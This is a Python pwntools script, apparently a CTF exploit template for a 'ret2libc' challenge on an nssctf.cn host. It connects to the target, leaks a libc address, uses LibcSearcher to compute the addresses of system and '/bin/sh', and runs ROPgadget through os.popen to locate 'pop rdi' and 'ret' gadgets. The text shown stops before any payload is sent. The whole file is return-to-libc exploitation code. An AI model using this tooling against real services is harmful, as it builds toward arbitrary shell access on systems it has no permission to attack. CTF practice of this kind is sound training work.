from pwn import *
from LibcSearcher import *
import os

dir = 'node5.anna.nssctf.cn:21747'
file = './ret2libc'
libc_target = ''
host,port = dir.split(':')

elf_state = True
libc_state = True
ps_state = True
shell = 'chmod +x '+ libc_target

try:
    p = remote(host,port)
except:
    ps_state = False

if libc_target == '':
    libc_state = False
else:
    try:
        libc = ELF(libc_target)
    except:
        os.system(shell)
        try:
            libc = ELF(libc_target)
        except:
            libc_state = False

try:
    elf = ELF(file)
except:
    elf_state = False

def answer(name, data = None, item = None):
    type_data = isinstance(data,str)
    if name == 'offest':
        if item is None:
            success(name + ': ' + hex(data))
        else:
            success(name + ': ' + hex(data) + '\t(' + item + ')')
    elif name == 'success':
        success(name)
    elif name == 'done':
        success(name + '!')
    else:
        if type_data == True:
            success(name + ' -> ' + data)
        else:
            if data == True or data == False:
                if name == 'ps_state':
                    if data == False:
                        data = 'local'
                    else:
                        data = 'internet'
                success(name + ' ->\t' + str(data))
            else:
                success(name + ' -> {:#x}'.format(data))

def gdb_pause():
    gdb.attach(p)

def p6(text):
    return p64(text)

def p3(text):
    return p32(text)

def data_recv_text():
    p.recv()
    p.recv()

def data_recv(name,type = None):
    #only ret2libc
    data = u64(p.recvuntil(b'\x7f')[1:].ljust(8,b'\x00'))
    answer(name,data)
    return data

def libc_compute(name,name_add):
    #only ret2libc
    libc = LibcSearcher(name,name_add)
    libc_base = name_add - libc.dump(name)
    global system_add
    global binsh_add
    binsh_add = libc_base + libc.dump('str_bin_sh')
    system_add = libc_base + libc.dump('system')
    answer('libc_base',libc_base)
    answer('system_add',system_add)
    answer('binsh_add',binsh_add)

answer('elf_state',elf_state)
answer('libc_state',libc_state)
answer('ps_state',ps_state)

if ps_state == True:
    p = remote(host,port)
else:
    p = process(file)

answer('done')

shell_rdi = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep rdi'
shell_ret = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"|grep ": ret"'
rdi = int(os.popen(shell_rdi).readlines()[0][2:19],16)
ret = int(os.popen(shell_ret).readlines()[0][2:19],16)

answer('rdi',rdi)
answer('ret',ret)
context(os='linux', arch='amd64',log_level = 'debug')
